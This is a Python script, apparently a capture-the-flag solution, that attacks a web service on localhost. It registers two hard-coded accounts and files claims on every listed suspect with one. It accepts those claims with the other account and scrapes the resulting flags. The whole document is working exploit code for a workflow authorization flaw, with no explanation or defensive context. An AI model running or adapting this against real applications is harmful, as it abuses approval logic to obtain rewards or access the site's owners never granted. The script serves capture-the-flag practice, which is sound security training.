import requests
import re
from bs4 import BeautifulSoup

url = "http://localhost:1015"
hacker_creds = {'username':'1m4h4ck3rr','password':'Level123'}
hacker2_creds = {'username':'7h353c0ndh4xx0r','password':'Level123'}

# parse service to get the list of sus IDs
def parse_suspects():
    s = requests.Session()
    req = s.post(url+"/register", hacker_creds)
    req = s.post(url+"/authorize", hacker_creds)
    req = s.get(url+"/sus_browser")
    pattern = r'<input\s+type="hidden"\s+name="ID"\s+value="(\d+)"\s*/>'
    match = re.search(pattern, req.text)
    if match:
        value = match.group(1)
        max_sus_id = int(value)
    else:
        print('Failed to parse page!')
        return
    return max_sus_id

# here the fun begins
max_sus_id = parse_suspects()
# authorize as first user
s = requests.Session()
req = s.post(url+"/register", hacker_creds)
req = s.post(url+"/authorize", hacker_creds)
# create claims on every sus
for i in range(1, max_sus_id+1):
    req = s.post(url+"/create_claim", data={"ID":str(i)})
# get list of our claim IDs
req = s.get(url+"/claim_browser")
soup = BeautifulSoup(req.text, 'html.parser')
claims = soup.find_all(class_='sus-tile')
claim_ids = [claim['id'].strip('claim_') for claim in claims if 'id' in claim.attrs]
# login as second user
req = s.post(url+"/register", hacker2_creds)
req = s.post(url+"/authorize", hacker2_creds)
# accept claims
for i in claim_ids:
    req = s.post(url+"/accept_claim", data={"ID":str(i)})
# go back to first user
req = s.post(url+"/register", hacker_creds)
req = s.post(url+"/authorize", hacker_creds)
# parse our finished claims to get flags
req = s.get(url+"/claim_browser")
soup = BeautifulSoup(req.text, 'html.parser')
claims = soup.find_all(class_='sus-tile')
flags = [claim.find('p', id='Reward').text for claim in claims if claim.find('p', id='Reward')]
for flag in flags:
    print(flag)
